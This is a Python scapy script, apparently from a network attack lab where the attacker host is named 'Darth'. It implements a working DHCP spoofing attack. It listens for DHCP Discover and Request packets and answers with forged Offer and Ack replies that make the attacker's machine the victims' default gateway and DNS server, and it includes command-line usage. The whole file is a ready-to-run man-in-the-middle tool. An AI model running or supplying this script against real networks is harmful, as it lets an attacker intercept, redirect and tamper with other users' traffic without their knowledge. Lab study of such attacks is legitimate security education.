"""
dhcp_spoof.py — run on Darth (attacker)
DHCP Spoofing: listens for DHCP Discover/Request from victims and responds
with forged DHCP Offer/Ack pointing to Darth as default gateway and DNS server.

Usage:
    sudo python3 dhcp_spoof.py
    sudo python3 dhcp_spoof.py --iface eth0 --pool 10.0.0.100 --router 10.0.0.30
"""

from scapy.all import *
import typer
from rich.console import Console

console = Console()

def build_offer(req, our_ip: str, offered_ip: str, router_ip: str, subnet: str, lease: int):
    xid = req[BOOTP].xid
    client_mac = req[Ether].src
    pkt = (
        Ether(src=get_if_hwaddr(conf.iface), dst=client_mac)
        / IP(src=our_ip, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(op=2, yiaddr=offered_ip, siaddr=our_ip, xid=xid, chaddr=req[BOOTP].chaddr)
        / DHCP(options=[
            ("message-type", "offer"),
            ("server_id", our_ip),
            ("lease_time", lease),
            ("subnet_mask", subnet),
            ("router", router_ip),
            ("name_server", router_ip),
            "end",
        ])
    )
    return pkt


def build_ack(req, our_ip: str, offered_ip: str, router_ip: str, subnet: str, lease: int):
    xid = req[BOOTP].xid
    client_mac = req[Ether].src
    pkt = (
        Ether(src=get_if_hwaddr(conf.iface), dst=client_mac)
        / IP(src=our_ip, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(op=2, yiaddr=offered_ip, siaddr=our_ip, xid=xid, chaddr=req[BOOTP].chaddr)
        / DHCP(options=[
            ("message-type", "ack"),
            ("server_id", our_ip),
            ("lease_time", lease),
            ("subnet_mask", subnet),
            ("router", router_ip),
            ("name_server", router_ip),
            "end",
        ])
    )
    return pkt


def main(
    iface: str = typer.Option(None, help="Network interface (default: scapy conf.iface)"),
    pool: str = typer.Option("10.0.0.100", help="IP address to offer to the client"),
    router: str = typer.Option("10.0.0.30", help="Gateway IP to advertise (Darth's IP)"),
    subnet: str = typer.Option("255.255.255.0", help="Subnet mask to advertise"),
    lease: int = typer.Option(3600, help="DHCP lease time in seconds"),
):
    if iface:
        conf.iface = iface
    our_ip = get_if_addr(conf.iface)

    console.print(f"[red]DHCP Spoofing started[/red]")
    console.print(f"  Interface:    {conf.iface}")
    console.print(f"  Our IP:       {our_ip}")
    console.print(f"  Offering IP:  {pool}")
    console.print(f"  Fake gateway: {router}")
    console.print("[yellow]Waiting for DHCP Discover / Request... Press Ctrl+C to stop.[/yellow]")

    def handle(pkt):
        if not pkt.haslayer(DHCP):
            return
        msg_type = next((v for k, v in pkt[DHCP].options if k == "message-type"), None)
        client_mac = pkt[Ether].src

        if msg_type == 1:  # Discover
            console.print(f"  [cyan]Discover[/cyan] from {client_mac} — sending Offer (IP={pool}, gw={router})")
            offer = build_offer(pkt, our_ip, pool, router, subnet, lease)
            sendp(offer, verbose=0)

        elif msg_type == 3:  # Request
            console.print(f"  [cyan]Request[/cyan]  from {client_mac} — sending Ack  (IP={pool}, gw={router})")
            ack = build_ack(pkt, our_ip, pool, router, subnet, lease)
            sendp(ack, verbose=0)

    sniff(filter="udp and (port 67 or port 68)", prn=handle, store=0)


if __name__ == "__main__":
    typer.run(main)
